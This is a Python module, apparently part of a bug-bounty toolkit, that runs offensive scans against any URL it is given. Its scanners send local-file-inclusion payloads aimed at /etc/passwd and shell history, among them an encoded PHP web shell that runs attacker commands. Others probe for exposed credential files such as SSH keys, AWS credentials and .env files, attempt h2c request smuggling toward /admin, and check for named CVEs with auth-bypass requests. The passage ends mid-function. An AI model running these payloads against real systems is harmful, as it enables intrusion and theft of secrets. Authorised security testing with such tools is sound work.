#!/usr/bin/env python3
"""
Advanced Bug Bounty Tools Module
Modern penetration testing techniques for comprehensive security assessment
"""

import asyncio
import json
import re
import os
import subprocess
import logging
import datetime
from typing import Dict, List, Optional, Any
import shlex
import tempfile

logger = logging.getLogger(__name__)


class AdvancedBugBountyTools:
    """Advanced bug bounty testing tools with modern techniques"""

    def __init__(self, tool_log_dir: str):
        self.tool_log_dir = tool_log_dir
        self.session = None

    def run_command(self, cmd: List[str], timeout: int = 60) -> Dict[str, Any]:
        """Execute shell command with timeout"""
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "return_code": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {
                "stdout": "",
                "stderr": f"Command timed out after {timeout} seconds",
                "return_code": -1
            }
        except Exception as e:
            return {
                "stdout": "",
                "stderr": str(e),
                "return_code": -1
            }

    async def advanced_lfi_scan(self, url: str, payloads_file: Optional[str] = None,
                               output_file: Optional[str] = None, timeout: int = 600) -> Dict[str, Any]:
        """
        Advanced LFI scanning with URL encoding bypass techniques
        Tests for Local File Inclusion vulnerabilities using various encoding methods
        """

        # Advanced LFI payloads with multiple encoding techniques
        lfi_payloads = [
            # Standard traversal
            "../../../../../../../../etc/passwd",
            "../../../../../../../../windows/system32/drivers/etc/hosts",

            # URL encoded
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fdrivers%2Fetc%2Fhosts",

            # Double URL encoded
            "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
            "..%252F..%252F..%252F..%252Fwindows%252Fsystem32%252Fdrivers%252Fetc%252Fhosts",

            # Dot bypass
            "....//....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",

            # Unicode encoding
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",

            # Null byte injection (historical)
            "../../../../../../../../etc/passwd%00",
            "../../../../../../../../etc/passwd%00.jpg",

            # Filter bypass
            "..././..././..././etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",

            # PHP wrappers
            "php://filter/convert.base64-encode/resource=../../../etc/passwd",
            "php://filter/read=string.rot13/resource=../../../etc/passwd",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",

            # Log poisoning paths
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/httpd/access_log",
            "/var/log/nginx/access.log",

            # Config files
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/etc/mysql/my.cnf",
            "/root/.bash_history",
            "/home/user/.bash_history"
        ]

        if payloads_file and os.path.exists(payloads_file):
            with open(payloads_file, 'r') as f:
                lfi_payloads.extend([line.strip() for line in f if line.strip()])

        # Generate output file path
        if not output_file:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = os.path.join(self.tool_log_dir, f"lfi_scan_{url.replace('/', '_').replace(':', '')}_{timestamp}.json")

        lfi_results = []
        tested_payloads = 0

        for payload in lfi_payloads:
            tested_payloads += 1

            # Test different parameter positions
            test_urls = []
            if '?' in url:
                test_urls.append(f"{url}&file={payload}")
                test_urls.append(f"{url}&path={payload}")
                test_urls.append(f"{url}&include={payload}")
                test_urls.append(f"{url}&page={payload}")
            else:
                test_urls.append(f"{url}?file={payload}")
                test_urls.append(f"{url}?path={payload}")
                test_urls.append(f"{url}?include={payload}")
                test_urls.append(f"{url}?page={payload}")

            for test_url in test_urls:
                try:
                    cmd = ["curl", "-s", "-k", "--max-time", "10", "-A", "Mozilla/5.0", test_url]
                    result = self.run_command(cmd, timeout=15)

                    # Check for LFI success indicators
                    linux_indicators = ["root:x:0:0:", "daemon:", "www-data:", "nobody:", "bin:x:"]
                    windows_indicators = ["# localhost", "127.0.0.1", "[boot loader]"]
                    config_indicators = ["[mysqld]", "DocumentRoot", "server_name", "listen"]

                    response_lower = result["stdout"].lower()
                    indicators_found = []

                    for indicator in linux_indicators + windows_indicators + config_indicators:
                        if indicator.lower() in response_lower:
                            indicators_found.append(indicator)

                    if indicators_found:
                        lfi_results.append({
                            "payload": payload,
                            "url": test_url,
                            "method": "GET",
                            "response_length": len(result["stdout"]),
                            "indicators_found": indicators_found,
                            "confidence": "high" if len(indicators_found) > 1 else "medium",
                            "response_preview": result["stdout"][:500],
                            "file_type": self._detect_file_type(result["stdout"])
                        })

                except Exception as e:
                    logger.debug(f"Error testing LFI payload {payload}: {e}")

        # Save results
        with open(output_file, 'w') as f:
            json.dump({
                "scan_type": "advanced_lfi",
                "target": url,
                "timestamp": datetime.datetime.now().isoformat(),
                "payloads_tested": tested_payloads,
                "vulnerabilities_found": len(lfi_results),
                "results": lfi_results
            }, f, indent=2)

        return {
            "status": "success",
            "url": url,
            "payloads_tested": tested_payloads,
            "vulnerabilities_found": len(lfi_results),
            "output_file": output_file,
            "results": lfi_results
        }

    def _detect_file_type(self, content: str) -> str:
        """Detect the type of file based on content"""
        content_lower = content.lower()

        if any(indicator in content_lower for indicator in ["root:x:", "daemon:", "nobody:"]):
            return "passwd_file"
        elif "127.0.0.1" in content_lower and "localhost" in content_lower:
            return "hosts_file"
        elif any(indicator in content_lower for indicator in ["[mysqld]", "datadir", "socket"]):
            return "mysql_config"
        elif any(indicator in content_lower for indicator in ["documentroot", "virtualhost"]):
            return "apache_config"
        elif "server_name" in content_lower and "listen" in content_lower:
            return "nginx_config"
        else:
            return "unknown"

    async def nuclei_ai_reconnaissance(self, targets_file: str, output_dir: str, timeout: int = 1800) -> Dict[str, Any]:
        """
        Advanced Nuclei AI reconnaissance using multiple AI queries for comprehensive scanning
        """

        # Advanced AI queries for modern vulnerabilities
        ai_queries = [
            "Find exposed AI/ML model files (.pkl, .h5, .pt) that may leak proprietary algorithms",
            "Find exposed automation scripts (.sh, .ps1, .bat) revealing internal tooling or credentials",
            "Identify misconfigured CSP headers allowing 'unsafe-inline' or wildcard sources",
            "Detect pages leaking JWT tokens in URLs or cookies",
            "Find application endpoints with verbose stack traces or source code exposure",
            "Find sensitive information in HTML comments (debug notes, API keys, credentials)",
            "Find exposed .env files leaking credentials, API keys, and database passwords",
            "Find exposed configuration files containing API keys and database credentials",
            "Find database configuration files leaking credentials",
            "Find exposed Docker and Kubernetes configuration files containing cloud credentials",
            "Find exposed SSH keys and configuration files",
            "Find exposed WordPress configuration files containing database credentials",
            "Identify exposed .npmrc and .yarnrc files leaking NPM authentication tokens",
            "Find exposed .git directories allowing full repo download",
            "Find exposed .svn and .hg repositories leaking source code",
            "Find GraphQL endpoints with introspection enabled",
            "Find publicly accessible phpinfo() pages leaking environment details",
            "Find exposed Swagger and API documentation",
            "Detect internal IP addresses in HTTP responses",
            "Find exposed WordPress debug.log files",
            "Detect misconfigured CORS allowing wildcard origins",
            "Find publicly accessible backup and log files",
            "Find exposed admin panels with default credentials",
            "Identify API endpoints that expose sensitive user data",
            "Detect web applications running in debug mode"
        ]

        results = {}
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        for i, query in enumerate(ai_queries):
            query_safe = query.replace(' ', '_').replace('/', '_')[:50]
            output_file = os.path.join(output_dir, f"nuclei_ai_{i:02d}_{query_safe}_{timestamp}.json")

            cmd = [
                "nuclei",
                "-list", targets_file,
                "-ai", query,
                "-json",
                "-o", output_file,
                "-rate-limit", "10",
                "-timeout", "15"
            ]

            try:
                result = self.run_command(cmd, timeout=300)  # 5 min per query

                findings = []
                if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                    with open(output_file, 'r') as f:
                        for line in f:
                            try:
                                findings.append(json.loads(line))
                            except:
                                continue

                results[query] = {
                    "query": query,
                    "findings_count": len(findings),
                    "output_file": output_file,
                    "findings": findings,
                    "execution_time": result.get("execution_time", 0)
                }

            except Exception as e:
                results[query] = {
                    "query": query,
                    "error": str(e),
                    "findings_count": 0
                }

        return {
            "status": "success",
            "queries_executed": len(ai_queries),
            "total_findings": sum(r.get("findings_count", 0) for r in results.values()),
            "results": results
        }

    async def wellknown_files_enumeration(self, url: str, output_file: Optional[str] = None,
                                        custom_wordlist: Optional[str] = None, timeout: int = 600) -> Dict[str, Any]:
        """
        Comprehensive enumeration of well-known sensitive files and directories
        """

        # Extensive list of sensitive files and paths
        sensitive_paths = [
            # Version control
            ".git/HEAD", ".git/config", ".git/index", ".git/logs/HEAD",
            ".svn/entries", ".svn/wc.db", ".hg/hgrc",

            # Environment and config files
            ".env", ".env.local", ".env.production", ".env.backup", ".env.dev",
            "config.json", "config.yaml", "config.yml", "config.php", "config.ini",
            "application.properties", "settings.py", "settings.json",

            # Database configs
            "database.yml", "db_config.php", ".pgpass", ".my.cnf", "mysql.conf",
            "mongod.conf", "redis.conf",

            # Container configs
            "docker-compose.yml", "docker-compose.yaml", "Dockerfile",
            "kubeconfig", ".dockercfg", ".docker/config.json", "k8s.yaml",

            # SSH and keys
            "id_rsa", "id_rsa.pub", "id_dsa", "id_dsa.pub", "id_ecdsa", "id_ed25519",
            "authorized_keys", "known_hosts", "ssh_config", "sshd_config",

            # Web application configs
            "wp-config.php", "wp-config.php.bak", "wp-config.php~", "wp-config.old",
            "web.config", ".htaccess", ".htpasswd", "httpd.conf", "nginx.conf",

            # Package managers
            ".npmrc", ".yarnrc", "package.json", "composer.json", "requirements.txt",
            "Gemfile", "Pipfile", "poetry.lock", "yarn.lock", "package-lock.json",

            # API and documentation
            "swagger.json", "swagger.yaml", "api-docs", "redoc", "graphql", "graphiql",
            "openapi.json", "postman.json",

            # Development files
            ".vscode/settings.json", ".vscode/launch.json",
            ".idea/workspace.xml", ".idea/dataSources.xml",
            "phpinfo.php", "info.php", "test.php", "debug.php",

            # Log files
            "debug.log", "error.log", "access.log", "app.log", "laravel.log",
            "application.log", "system.log",

            # Backup files
            "backup.zip", "backup.tar.gz", "backup.sql", "dump.sql", "database.sql",
            "site-backup.zip", "www.zip", "html.zip", "backup.7z",

            # Admin interfaces
            "admin", "admin/", "admin.php", "administrator", "phpmyadmin",
            "adminer.php", "wp-admin/", "cpanel", "webmail",

            # Security files
            ".well-known/security.txt", "security.txt", "crossdomain.xml",
            "clientaccesspolicy.xml", "robots.txt", "sitemap.xml",

            # Cloud and CI/CD
            ".aws/credentials", ".aws/config", ".gcp/credentials",
            ".github/workflows/", ".gitlab-ci.yml", "circle.yml", "travis.yml",
            "Jenkinsfile", "azure-pipelines.yml",

            # Framework specific
            "artisan", "manage.py", "console", "app.js", "server.js",
            "index.php", "index.html", "default.html"
        ]

        if custom_wordlist and os.path.exists(custom_wordlist):
            with open(custom_wordlist, 'r') as f:
                sensitive_paths.extend([line.strip() for line in f if line.strip()])

        if not output_file:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = os.path.join(self.tool_log_dir, f"wellknown_scan_{url.replace('/', '_').replace(':', '')}_{timestamp}.json")

        base_url = url.rstrip('/')
        findings = []

        for path in sensitive_paths:
            test_url = f"{base_url}/{path.lstrip('/')}"

            try:
                cmd = [
                    "curl", "-s", "-k", "-L", "--max-time", "5",
                    "-w", "%{http_code}:%{size_download}:%{content_type}",
                    "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    test_url
                ]

                result = self.run_command(cmd, timeout=10)

                if result["stdout"]:
                    lines = result["stdout"].split('\n')
                    if len(lines) >= 2:
                        status_info = lines[-1]
                        response_body = '\n'.join(lines[:-1])

                        try:
                            parts = status_info.split(':')
                            status_code = parts[0] if len(parts) > 0 else "000"
                            size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
                            content_type = parts[2] if len(parts) > 2 else ""

                            if status_code == "200" and size > 0:
                                # Analyze content for sensitivity
                                sensitivity_score = self._calculate_sensitivity_score(response_body, path)

                                findings.append({
                                    "path": path,
                                    "url": test_url,
                                    "status_code": status_code,
                                    "size": size,
                                    "content_type": content_type,
                                    "sensitivity_score": sensitivity_score,
                                    "is_sensitive": sensitivity_score > 3,
                                    "response_preview": response_body[:300],
                                    "file_type": self._identify_file_type(path, content_type, response_body)
                                })
                        except ValueError:
                            continue

            except Exception as e:
                logger.debug(f"Error testing path {path}: {e}")

        # Save results
        with open(output_file, 'w') as f:
            json.dump({
                "scan_type": "wellknown_files",
                "target": url,
                "timestamp": datetime.datetime.now().isoformat(),
                "paths_tested": len(sensitive_paths),
                "findings_count": len(findings),
                "sensitive_findings": len([f for f in findings if f["is_sensitive"]]),
                "results": findings
            }, f, indent=2)

        return {
            "status": "success",
            "url": url,
            "paths_tested": len(sensitive_paths),
            "findings_count": len(findings),
            "sensitive_findings": len([f for f in findings if f["is_sensitive"]]),
            "output_file": output_file,
            "results": findings
        }

    def _calculate_sensitivity_score(self, content: str, path: str) -> int:
        """Calculate sensitivity score based on content and path"""
        score = 0
        content_lower = content.lower()

        # High value keywords
        high_value_keywords = [
            'password', 'secret', 'key', 'token', 'api_key', 'private_key',
            'database', 'mysql', 'postgres', 'mongodb', 'redis',
            'aws_access', 'aws_secret', 'gcp', 'azure', 'cloud',
            'admin', 'root', 'sudo', 'credentials', 'auth'
        ]

        for keyword in high_value_keywords:
            if keyword in content_lower:
                score += 2

        # Sensitive file extensions
        if any(ext in path.lower() for ext in ['.env', '.config', '.key', '.pem', '.p12']):
            score += 3

        # Version control indicators
        if any(indicator in content_lower for indicator in ['repositoryformatversion', '[core]', 'bare = false']):
            score += 4

        # Database connection strings
        if re.search(r'(mysql|postgresql|mongodb)://[\w:@./]+', content_lower):
            score += 5

        return min(score, 10)  # Cap at 10

    def _identify_file_type(self, path: str, content_type: str, content: str) -> str:
        """Identify the type of file found"""
        path_lower = path.lower()
        content_lower = content.lower()

        if '.git' in path_lower:
            return 'version_control'
        elif any(ext in path_lower for ext in ['.env', '.config']):
            return 'configuration'
        elif 'id_rsa' in path_lower or '.pem' in path_lower:
            return 'ssh_key'
        elif 'docker' in path_lower or 'kube' in path_lower:
            return 'container_config'
        elif any(db in content_lower for db in ['mysql', 'postgres', 'mongodb']):
            return 'database_config'
        elif 'application/json' in content_type:
            return 'json_data'
        elif 'text/html' in content_type:
            return 'web_page'
        else:
            return 'unknown'

    async def http2_upgrade_bypass_test(self, url: str, output_file: Optional[str] = None, timeout: int = 300) -> Dict[str, Any]:
        """
        Test for HTTP/2 Cleartext (h2c) upgrade vulnerabilities and potential WAF bypass
        """

        if not output_file:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = os.path.join(self.tool_log_dir, f"h2c_test_{url.replace('/', '_').replace(':', '')}_{timestamp}.json")

        results = []

        # Test 1: Basic H2C upgrade request
        try:
            cmd = [
                "curl", "-s", "-k", "--max-time", "10",
                "-H", "Upgrade: h2c",
                "-H", "Connection: Upgrade",
                "-H", "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA",
                "-w", "%{http_code}:%{size_download}",
                url
            ]

            result = self.run_command(cmd, timeout=15)

            if "101" in result["stdout"]:  # HTTP/1.1 101 Switching Protocols
                results.append({
                    "test": "h2c_upgrade",
                    "status": "vulnerable",
                    "description": "Server accepts H2C upgrade - Potential WAF bypass",
                    "risk_level": "high",
                    "response": result["stdout"],
                    "exploitation": "Can potentially bypass WAF/security controls after upgrade"
                })
            else:
                results.append({
                    "test": "h2c_upgrade",
                    "status": "not_vulnerable",
                    "description": "Server rejects H2C upgrade",
                    "response": result["stdout"]
                })

        except Exception as e:
            results.append({
                "test": "h2c_upgrade",
                "status": "error",
                "description": f"Error testing H2C upgrade: {e}"
            })

        # Test 2: HTTP/2 support detection
        try:
            cmd = ["curl", "-s", "-k", "--http2", "--max-time", "10", "-I", url]
            result = self.run_command(cmd, timeout=15)

            if "HTTP/2" in result["stdout"]:
                results.append({
                    "test": "http2_support",
                    "status": "supported",
                    "description": "Server supports HTTP/2",
                    "headers": result["stdout"][:300]
                })

        except Exception as e:
            results.append({
                "test": "http2_support",
                "status": "error",
                "description": f"Error testing HTTP/2: {e}"
            })

        # Test 3: Protocol smuggling attempt
        try:
            # Create malformed request for protocol confusion
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                f.write("GET / HTTP/1.1\r\n")
                f.write(f"Host: {url.split('//')[1].split('/')[0]}\r\n")
                f.write("Upgrade: h2c\r\n")
                f.write("Connection: Upgrade\r\n")
                f.write(":method: POST\r\n")
                f.write(":path: /admin\r\n")
                f.write("\r\n")
                temp_file = f.name

            cmd = ["curl", "-s", "-k", "--max-time", "10", "--data-binary", f"@{temp_file}", url]
            result = self.run_command(cmd, timeout=15)

            os.unlink(temp_file)

            results.append({
                "test": "protocol_smuggling",
                "status": "tested",
                "description": "Attempted HTTP/2 protocol smuggling",
                "response_length": len(result["stdout"]),
                "potential_bypass": len(result["stdout"]) > 100 and "error" not in result["stdout"].lower()
            })

        except Exception as e:
            results.append({
                "test": "protocol_smuggling",
                "status": "error",
                "description": f"Error testing protocol smuggling: {e}"
            })

        # Save results
        with open(output_file, 'w') as f:
            json.dump({
                "scan_type": "h2c_bypass_test",
                "target": url,
                "timestamp": datetime.datetime.now().isoformat(),
                "tests_run": len(results),
                "vulnerabilities": [r for r in results if r.get("status") == "vulnerable"],
                "results": results
            }, f, indent=2)

        vulnerable_tests = [r for r in results if r.get("status") == "vulnerable"]

        return {
            "status": "success",
            "url": url,
            "tests_run": len(results),
            "vulnerabilities_found": len(vulnerable_tests),
            "output_file": output_file,
            "results": results
        }

    async def cve_vulnerability_check(self, target: str, output_file: Optional[str] = None, timeout: int = 600) -> Dict[str, Any]:
        """
        Check for recent high-impact CVE vulnerabilities
        """

        if not output_file:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = os.path.join(self.tool_log_dir, f"cve_check_{target.replace('/', '_').replace(':', '')}_{timestamp}.json")

        # Recent critical CVEs with detection methods
        cve_database = {
            "CVE-2025-57819": {
                "name": "FreePBX Authentication Bypass",
                "severity": "CRITICAL",
                "score": 10.0,
                "test_paths": ["/admin/config.php", "/admin/", "/freepbx/"],
                "detection_methods": ["GET"],
                "indicators": ["FreePBX", "Asterisk", "admin", "pbx"],
                "exploit_available": True
            },
            "CVE-2025-47812": {
                "name": "Wing FTP Server RCE",
                "severity": "CRITICAL",
                "score": 10.0,
                "test_paths": ["/admin", "/wing-ftp", "/"],
                "detection_methods": ["GET"],
                "indicators": ["Wing FTP Server", "Wing FTP", "FTP Server"],
                "exploit_available": True
            },
            "CVE-2025-41646": {
                "name": "RevPi Webstatus Auth Bypass",
                "severity": "CRITICAL",
                "score": 9.8,
                "test_paths": ["/api/login", "/login", "/webstatus/"],
                "detection_methods": ["POST"],
                "payload": '{"hashcode": true}',
                "indicators": ["RevPi", "webstatus", "revolution pi"],
                "exploit_available": True
            },
            "CVE-2025-32432": {
                "name": "CraftCMS RCE",
                "severity": "CRITICAL",
                "score": 10.0,
                "test_paths": ["/", "/admin/", "/craft/"],
                "detection_methods": ["GET"],
                "headers": {"X-Powered-By": "Craft CMS"},
                "indicators": ["Craft CMS", "craft", "pixel & tonic"],
                "exploit_available": True
            }
        }

        results = []
        base_url = target.rstrip('/')

        for cve_id, cve_info in cve_database.items():
            cve_result = {
                "cve_id": cve_id,
                "name": cve_info["name"],
                "severity": cve_info["severity"],
                "score": cve_info["score"],
                "vulnerable": False,
                "confidence": "low",
                "tests_performed": []
            }

            for test_path in cve_info["test_paths"]:
                test_url = f"{base_url}{test_path}"

                for method in cve_info["detection_methods"]:
                    try:
                        if method == "GET":
                            cmd = ["curl", "-s", "-k", "--max-time", "10", "-w", "%{http_code}", test_url]
                        else:  # POST
                            cmd = ["curl", "-s", "-k", "--max-time", "10", "-X", "POST"]
                            cmd.extend(["-H", "Content-Type: application/json"])
                            if "payload" in cve_info:
                                cmd.extend(["-d", cve_info["payload"]])
                            cmd.extend(["-w", "%{http_code}", test_url])

                        if "headers" in cve_info:
                            for header
